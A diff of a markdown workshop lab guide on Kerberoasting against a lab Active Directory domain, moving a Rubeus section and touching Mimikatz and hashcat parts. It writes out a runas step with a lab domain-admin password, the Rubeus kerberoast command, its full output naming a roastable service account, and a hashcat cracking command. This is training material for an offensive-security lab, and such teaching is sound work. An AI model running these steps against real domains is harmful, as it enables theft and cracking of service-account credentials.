@@ -8,92 +8,9 @@ That last bit makes judging the effectiveness of kerberoasting quite difficult, 
 
 Enough of the preamble, let's get to it!
 
-## Kerberoasting via Rubeus
-
-We'll begin by using Rubeus, a commonly-used tool that fully automated the Kerberoasting process. This attack couldn't be simpler than using Rubeus -- Let's see why!
-
-At this point you should still be RDP'd to TWORIVERS from the attack machine. On TWORIVERS, do the following:
-
-1. Use RunAs to run a PowerShell prompt as `WHEEL\Administrator`:
-    
-    1. Start menu -> type `run` -> click "Run (App)" -> enter:
-    
-    ```powershell
-    runas /user:wheel\Administrator powershell.exe
-    ```
-    
-    - You will be prompted to `Enter the password for wheel\Administrator:`, which is:
-        
-        ```
-        12qwaszx!@QWASZX
-        ```
-    
-    A new PowerShell prompt with the title `Administrator: powershell.exe (running as wheel\Administrator` will open. Good!
-
-    Now that we are running PowerShell as a domain admin, let's enumerate AD!
-
-1. Extract Rubeus:
-
-    ```powershell
-    cd C:\Users\Public\Desktop\LAB_FILES\assets\
-    expand-archive .\Rubeus-alt.zip
-    cd .\Rubeus-alt
-    ```
-
-    As a note, [Rubeus is provided as source code](https://for528.com/rubeus). Some TAs will use [a well-known pre-compiled version in their attacks](https://for528.com/ghostpack-compiled), while others will compile the tool from source. The `Rubeus-alt.zip` archive above is actually the pre-compiled version from [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Rubeus.exe).
-
-1. Perform a Kerberoasting attack using Rubeus:
-    
-    ```powershell
-    ./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt
-    ```
-
-    Above we used the `/format:hashcat` option to tell Rubeus to output hashes in hashcat format. [The project's Roast.cs source file](https://github.com/GhostPack/Rubeus/blob/659d98d8582573c2ff8c3a68ee0b02d7d5f8387d/Rubeus/lib/Roast.cs#L207) accepts either `john` or `hashcat` as the output options. Many TAs like to use [haschat](https://for528.com/hashcat) because of its strong support for GPU cracking.
-
-    Expected output:
-    
-    ```
-    ./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt
-
-       ______        _
-      (_____ \      | |
-       _____) )_   _| |__  _____ _   _  ___
-      |  __  /| | | |  _ \| ___ | | | |/___)
-      | |  \ \| |_| | |_) ) ____| |_| |___ |
-      |_|   |_|____/|____/|_____)____/(___/
-
-      v2.2.0
-
-
-    [*] Action: Kerberoasting
-
-    [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
-    [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
-
-    [*] Target Domain          : wheel.co
-    [*] Searching path 'LDAP://tarvalon.wheel.co/DC=wheel,DC=co' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'
-
-    [*] Total kerberoastable users : 1
-
-
-    [*] SamAccountName         : svc-file
-    [*] DistinguishedName      : CN=svc-file,CN=Users,DC=wheel,DC=co
-    [*] ServicePrincipalName   : HOST/shadarlogoth.wheel.co
-    [*] PwdLastSet             : 8/7/2023 2:08:41 AM
-    [*] Supported ETypes       : RC4_HMAC_DEFAULT
-    [*] Hash written to C:\Perflogs\hashes.txt
-
-    [*] Roasted hashes written to : C:\Perflogs\hashes.txt
-    PS C:\Users\Public\Desktop\LAB_FILES\assets\Rubeus-alt>
-    ```
-    
-    So far, so good! You now have a `hashes.txt` file at `C:\Perflogs\hashes.txt` that includes the kerberoastable hashes. Notice that we have identified that the `svc-file` account has a SPN of `HOST/shadarlogoth.wheel.co`. Also note that the encryption support is RC4, which is insecure and exactly what we want!
-
-    __Though we will not be covering the process in a step-by-step fashion, we will show you how these hashes could be cracked if we have time after the primary portions of our workshop have been completed.__
-
 ## Kerberoasting via Mimikatz
 
-Next we'll be usin Mimikatz to perform a Kerberoasting attack.
+Next we'll be using Mimikatz to perform a Kerberoasting attack.
 
 To begin, you'll be using the same elevated PowerShell prompt via the `WHEEL\Administrator` account. If you closed the window, simply follow step #1 in the [Kerberoasting via Rubeus](#kerberoasting-via-rubeus) section above, then follow the steps below.
 
@@ -261,11 +178,95 @@ This serves as a great example as to why being able to review source code can pr
     
 Congrats! You've now dumped your in-memory tickets to disk. Your next step would be to crack the kirbi files.
 
+---
+
+## Extra - Kerberoasting via Rubeus
+
+We'll begin by using Rubeus, a commonly-used tool that fully automated the Kerberoasting process. This attack couldn't be simpler than using Rubeus -- Let's see why!
+
+At this point you should still be RDP'd to TWORIVERS from the attack machine. On TWORIVERS, do the following:
+
+1. Use RunAs to run a PowerShell prompt as `WHEEL\Administrator`:
+    
+    1. Start menu -> type `run` -> click "Run (App)" -> enter:
+    
+    ```powershell
+    runas /user:wheel\Administrator powershell.exe
+    ```
+    
+    - You will be prompted to `Enter the password for wheel\Administrator:`, which is:
+        
+        ```
+        12qwaszx!@QWASZX
+        ```
+    
+    A new PowerShell prompt with the title `Administrator: powershell.exe (running as wheel\Administrator` will open. Good!
+
+    Now that we are running PowerShell as a domain admin, let's enumerate AD!
+
+1. Extract Rubeus:
+
+    ```powershell
+    cd C:\Users\Public\Desktop\LAB_FILES\assets\
+    expand-archive .\Rubeus-alt.zip
+    cd .\Rubeus-alt
+    ```
+
+    As a note, [Rubeus is provided as source code](https://for528.com/rubeus). Some TAs will use [a well-known pre-compiled version in their attacks](https://for528.com/ghostpack-compiled), while others will compile the tool from source. The `Rubeus-alt.zip` archive above is actually the pre-compiled version from [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Rubeus.exe).
+
+1. Perform a Kerberoasting attack using Rubeus:
+    
+    ```powershell
+    ./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt
+    ```
+
+    Above we used the `/format:hashcat` option to tell Rubeus to output hashes in hashcat format. [The project's Roast.cs source file](https://github.com/GhostPack/Rubeus/blob/659d98d8582573c2ff8c3a68ee0b02d7d5f8387d/Rubeus/lib/Roast.cs#L207) accepts either `john` or `hashcat` as the output options. Many TAs like to use [haschat](https://for528.com/hashcat) because of its strong support for GPU cracking.
+
+    Expected output:
+    
+    ```
+    ./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.2.0
+
+
+    [*] Action: Kerberoasting
+
+    [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+    [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+    [*] Target Domain          : wheel.co
+    [*] Searching path 'LDAP://tarvalon.wheel.co/DC=wheel,DC=co' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'
+
+    [*] Total kerberoastable users : 1
+
+
+    [*] SamAccountName         : svc-file
+    [*] DistinguishedName      : CN=svc-file,CN=Users,DC=wheel,DC=co
+    [*] ServicePrincipalName   : HOST/shadarlogoth.wheel.co
+    [*] PwdLastSet             : 8/7/2023 2:08:41 AM
+    [*] Supported ETypes       : RC4_HMAC_DEFAULT
+    [*] Hash written to C:\Perflogs\hashes.txt
+
+    [*] Roasted hashes written to : C:\Perflogs\hashes.txt
+    PS C:\Users\Public\Desktop\LAB_FILES\assets\Rubeus-alt>
+    ```
+    
+    So far, so good! You now have a `hashes.txt` file at `C:\Perflogs\hashes.txt` that includes the kerberoastable hashes. Notice that we have identified that the `svc-file` account has a SPN of `HOST/shadarlogoth.wheel.co`. Also note that the encryption support is RC4, which is insecure and exactly what we want!
+
+    __Though we will not be covering the process in a step-by-step fashion, we will show you how these hashes could be cracked if we have time after the primary portions of our workshop have been completed.__
+
+
 ## BONUS: Cracking Methods
 
 ### hashcat
-
-Ryan will show this method on his machine :).
 
 ```
 $ hashcat -m 13100 hashes.txt super_secure_passwords.txt 
